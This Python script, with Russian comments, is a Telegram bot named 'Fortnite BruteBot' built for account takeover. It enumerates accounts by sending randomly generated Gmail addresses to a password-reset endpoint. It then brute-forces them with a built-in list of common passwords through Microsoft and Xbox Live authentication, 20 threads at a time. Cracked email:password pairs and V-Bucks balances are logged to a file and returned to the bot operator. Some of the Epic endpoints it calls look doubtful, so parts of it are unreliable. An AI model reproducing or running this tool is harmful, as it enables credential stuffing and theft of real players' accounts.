#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
import requests
import re
import random
import string
import time
import threading
import queue
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================== КОНФИГУРАЦИЯ ==================
BOT_TOKEN = ""  # замените на реальный токен

bot = telebot.TeleBot(BOT_TOKEN)

# ================== СЛОВАРЬ ПАРОЛЕЙ ==================
PASSWORDS = [
    "password", "qwerty", "admin", "root", "123456", "12345678", "123456789",
    "password1", "qwerty123", "admin123", "root123", "fortnite", "epicgames",
    "gaming", "player", "killer", "master", "shadow", "dragon", "legend",
    "battle", "royale", "winning", "superman", "batman", "starwars",
    "computer", "internet", "network", "security", "!QAZ2wsx", "1qazxsw2",
    "Password123!", "Qwerty123!", "Admin2026!", "Root@2026"
]

# ================== ФУНКЦИИ РАБОТЫ С EPIC ==================
def get_session():
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
    return s

def microsoft_auth(email, password):
    session = get_session()
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": "000000004C12AE6F",
        "scope": "service::user.auth.xboxlive.com::MBI_SSL",
        "username": email,
        "password": password,
        "grant_type": "password"
    }
    try:
        resp = session.post(url, data=data, timeout=12)
        if resp.status_code != 200:
            return None, "auth_fail"
        token_data = resp.json()
        if 'access_token' not in token_data:
            return None, "no_token"
        # XBL
        xbl_resp = session.post("https://user.auth.xboxlive.com/user/authenticate", json={
            "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token_data['access_token']},
            "RelyingParty": "http://auth.xboxlive.com",
            "TokenType": "JWT"
        }, timeout=12)
        if xbl_resp.status_code != 200:
            return None, "xbl_fail"
        xbl_token = xbl_resp.json().get('Token')
        # XSTS
        xsts_resp = session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={
            "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
            "RelyingParty": "http://spartacertificate.epicgames.com",
            "TokenType": "JWT"
        }, timeout=12)
        if xsts_resp.status_code != 200:
            return None, "xsts_fail"
        xsts_data = xsts_resp.json()
        user_hash = xsts_data.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
        token = xsts_data.get('Token')
        return {'user_hash': user_hash, 'token': token}, "success"
    except:
        return None, "error"

def check_fortnite(user_hash, token):
    session = get_session()
    headers = {"Authorization": f"XBL3.0 x={user_hash};{token}", "Accept": "application/json"}
    try:
        resp = session.get("https://spartacertificate.epicgames.com/api/v2/account", headers=headers, timeout=12)
        if resp.status_code == 200:
            data = resp.json()
            return {'full_access': True, 'account_id': data.get('accountId'), 'display_name': data.get('displayName'), 'vbucks': data.get('currency', {}).get('vbucks', 0)}
        return {'full_access': False}
    except:
        return {'full_access': False}

def attempt_login(email, password):
    auth_result, status = microsoft_auth(email, password)
    if status != "success" or auth_result is None:
        return None, status
    acc_info = check_fortnite(auth_result['user_hash'], auth_result['token'])
    if acc_info.get('full_access'):
        return {'account': acc_info}, "success"
    return None, "no_access"

def check_account_exists(email):
    session = get_session()
    try:
        resp = session.post("https://www.epicgames.com/account/v2/password/reset", json={"email": email}, timeout=10)
        return resp.status_code == 200
    except:
        return False

def brute_single(email, timeout=20):
    start = time.time()
    for pwd in PASSWORDS:
        if time.time() - start > timeout:
            return None
        result, status = attempt_login(email, pwd)
        if result is not None:
            return (pwd, result['account'])
    return None

# ================== КОМАНДЫ БОТА (без проверки ID) ==================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    bot.reply_to(message,
        f"🤖 Fortnite BruteBot\n"
        f"Словарь: {len(PASSWORDS)} паролей\n"
        f"/bruteforce email — перебор для одного email\n"
        f"/auto_mass [число] — массовая проверка\n"
        f"/show_found — показать найденные аккаунты\n"
        f"/stop — остановить процесс"
    )

@bot.message_handler(commands=['bruteforce'])
def cmd_bruteforce(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Укажите email: /bruteforce target@example.com")
        return
    email = args[1]
    bot.reply_to(message, f"⏳ Брутфорс для {email}... (до 20 сек)")
    result = brute_single(email)
    if result:
        pwd, acc = result
        bot.reply_to(message,
            f"✅ НАЙДЕН!\n{email}:{pwd}\nID: {acc.get('account_id')}\nV-Bucks: {acc.get('vbucks', 0)}")
        with open("found.txt", "a") as f:
            f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
    else:
        bot.reply_to(message, f"❌ Пароль не найден для {email}")

@bot.message_handler(commands=['auto_mass'])
def cmd_auto_mass(message):
    args = message.text.split()
    count = 20000 if len(args) < 2 else int(args[1])
    bot.reply_to(message, f"🚀 Генерация {count} email и проверка... (может занять время)")
    generated = set()
    while len(generated) < count:
        prefix = random.choice(["user","player","gamer","shadow","killer","master","legend","dragon","night","storm"])
        suffix = ''.join(random.choices(string.digits, k=4))
        generated.add(f"{prefix}{suffix}@gmail.com")
    emails = list(generated)
    bot.reply_to(message, f"✅ Сгенерировано {len(emails)} email. Проверка существования...")
    existing = []
    for e in emails:
        if check_account_exists(e):
            existing.append(e)
    bot.reply_to(message, f"🔍 Найдено {len(existing)} аккаунтов. Начинаем брутфорс...")
    found = {}
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(brute_single, email): email for email in existing[:100]}
        for future in as_completed(futures):
            email = futures[future]
            result = future.result()
            if result:
                pwd, acc = result
                found[email] = (pwd, acc)
                with open("found.txt", "a") as f:
                    f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
    if found:
        msg = "\n".join([f"{e}:{pwd}" for e, (pwd, _) in found.items()])
        bot.reply_to(message, f"✅ Найдено {len(found)} аккаунтов:\n{msg[:4000]}")
    else:
        bot.reply_to(message, "❌ Ничего не найдено.")

@bot.message_handler(commands=['show_found'])
def cmd_show_found(message):
    if not os.path.exists("found.txt"):
        bot.reply_to(message, "❌ Нет найденных аккаунтов.")
        return
    with open("found.txt", "r") as f:
        lines = f.readlines()
    if not lines:
        bot.reply_to(message, "❌ Файл пуст.")
        return
    pairs = []
    for line in lines:
        if ' |' in line:
            pairs.append(line.split(' |')[0])
        else:
            pairs.append(line.strip())
    content = "\n".join(pairs)
    if len(content) > 4000:
        with open("temp_pairs.txt", "w") as f:
            f.write(content)
        with open("temp_pairs.txt", "rb") as f:
            bot.send_document(message.chat.id, f, caption="📋 Все аккаунты")
        os.remove("temp_pairs.txt")
    else:
        bot.reply_to(message, f"📋 Аккаунты:\n<code>{content}</code>", parse_mode="HTML")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    bot.reply_to(message, "⏹️ Остановка не реализована в этой версии.")

# ================== ЗАПУСК ==================
if __name__ == "__main__":
    try:
        bot.remove_webhook()
        print("Вебхук сброшен.")
    except Exception as e:
        print(f"Ошибка сброса вебхука: {e}")
    print("Бот запущен...")
    bot.polling(non_stop=True, skip_pending=True)